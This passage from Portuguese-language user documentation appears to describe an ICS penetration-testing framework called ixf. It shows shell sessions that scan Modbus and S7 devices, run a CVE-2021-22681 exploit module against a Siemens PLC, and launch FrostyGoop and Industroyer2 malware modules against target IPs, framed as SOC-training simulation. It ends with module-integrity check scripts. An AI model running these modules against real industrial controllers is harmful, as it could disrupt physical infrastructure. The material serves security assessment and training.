ixf (Modbus TCP Device Detect) > check
ixf (Modbus TCP Device Detect) > run
ixf (Modbus TCP Device Detect) > back
ixf > use scanners/ics/s7_comm_scanner
ixf (Siemens S7 Communication Scanner) > run
ixf (Siemens S7 Communication Scanner) > back
ixf > mitre-scan discovery 10.0.1.0/24
ixf > ttp T0843 10.0.1.100
ixf > ttp T0836 10.0.1.100
ixf > assess iec62443/zone_conduit_audit
ixf > assess risk/ics_risk_scorer
ixf > report html
ixf > mitre-report layer
```

### Cenário 2: Avaliação focada em Siemens S7 com SAST

```
ixf > search siemens
ixf > cve CVE-2021-22681
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 192.168.1.50
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > check
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > run
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > back
ixf > llm-key gemini AIzaSy...
ixf > sast /opt/plc_projects/s7_water_pump.scl --mode sast
ixf > report json
```

### Cenário 3: Simulação de malware ICS para treinamento SOC

```
ixf > search malware
ixf > use cve/malware/frostygoop_modbus_heating
ixf (FrostyGoop Modbus Heating Attack) > set target 192.168.1.100
ixf (FrostyGoop Modbus Heating Attack) > run
# Saída de simulação detalhada — ideal para criar regras de detecção SIEM
ixf (FrostyGoop Modbus Heating Attack) > back
ixf > use cve/malware/industroyer2_iec104
ixf (Industroyer2 IEC 104 Attack) > set target 192.168.1.200
ixf (Industroyer2 IEC 104 Attack) > run
ixf > mitre-report layer
```

---

## Diagnósticos e Verificação de Ambiente

### Verificar ambiente completo

```bash
python tools/env_doctor.py
```

### Verificar índice de módulos

```bash
python -c "
from industrialxpl.core.exploit.utils import index_modules
mods = index_modules()
print(f'{len(mods)} módulos indexados')
assert len(mods) > 900, 'Contagem de módulos abaixo do esperado!'
print('OK — Instalação íntegra')
"
```

### Verificar módulos com erros de importação

```bash
python -c "
from industrialxpl.core.exploit.utils import index_modules, import_exploit
mods = index_modules()
erros = []
for m in mods:
    try:
        import_exploit('industrialxpl.modules.' + m)()
    except Exception as e:
        erros.append((m, str(e)))
print(f'{len(mods)} módulos | {len(erros)} erros')
if erros:
    for m, e in erros[:10]:
        print(f'  ERR {m}: {e}')
"
```

---

*Anterior: [Instalação](01-instalacao.md) | Próximo: [Referência do Shell](03-referencia-shell.md)*
